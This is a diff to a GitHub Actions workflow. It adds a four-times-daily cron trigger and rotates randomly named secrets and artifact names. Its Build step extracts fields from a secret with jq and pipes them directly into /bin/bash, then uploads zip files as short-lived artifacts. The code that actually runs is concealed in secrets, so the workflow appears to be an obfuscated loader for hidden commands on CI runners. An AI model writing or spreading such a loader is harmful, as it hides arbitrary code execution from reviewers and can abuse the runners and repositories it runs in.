@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '8 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,19 +24,16 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          am854: ${{ secrets.am854 }}
+          wwdb56: ${{ secrets.wwdb56 }}
         run: |
-          printf '%s' "$am854" | jq -r .hpz79 | /bin/bash
-          echo $mbxk7922 | jq -r .trwac1343 | /bin/bash
-          echo $y46741 | jq -r .pwj4351 | /bin/bash
-          printf '%s' "$jraln76132" | jq -r .ep6 | /bin/bash
-          printf '%s' "$kn55979" | jq -r .hte92 | /bin/bash
-          printf '%s' "$wg998" | jq -r .e423 | /bin/bash
+          printf '%s' "$wwdb56" | jq -r .l835 | /bin/bash
+          echo $odiz9196 | jq -r .apm696 | /bin/bash
+          printf '%s' "$uyf42457" | jq -r .hafp85295 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: ek2I8ckF
+          name: caLBOHTM
           path: "*.zip"
           retention-days: 1
